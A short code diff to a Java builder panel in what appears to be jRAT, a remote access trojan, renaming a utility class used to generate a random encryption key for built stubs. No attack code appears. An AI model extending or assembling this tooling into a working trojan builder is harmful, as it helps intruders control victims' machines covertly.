@@ -25,7 +25,7 @@ import pro.jrat.net.PortListener;
 import pro.jrat.settings.Settings;
 import pro.jrat.ui.components.EncryptionKeyJTextField;
 import pro.jrat.ui.components.PortListenerJComboBox;
-import pro.jrat.utils.Util;
+import pro.jrat.utils.Utils;
 
 
 @SuppressWarnings("serial")
@@ -114,7 +114,7 @@ public class PanelBuildGeneral extends JPanel {
 		JButton button_2 = new JButton("");
 		button_2.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				txtKey.setText(Util.randomString(Crypto.KEY_LENGTH));
+				txtKey.setText(Utils.randomString(Crypto.KEY_LENGTH));
 				txtKey.onUpdate(true);
 			}
 		});
@@ -139,7 +139,7 @@ public class PanelBuildGeneral extends JPanel {
 		txtKey.setColumns(10);
 		setLayout(groupLayout);
 
-		txtKey.setText(Settings.getGlobal().getString("bkey").length() == Crypto.KEY_LENGTH ? Settings.getGlobal().getString("bkey") : Util.randomString(Crypto.KEY_LENGTH));
+		txtKey.setText(Settings.getGlobal().getString("bkey").length() == Crypto.KEY_LENGTH ? Settings.getGlobal().getString("bkey") : Utils.randomString(Crypto.KEY_LENGTH));
 
 		lblLength = new JLabel(txtKey.getText().length() + "");
 		lblLength.setBounds(331, 60, 46, 14);
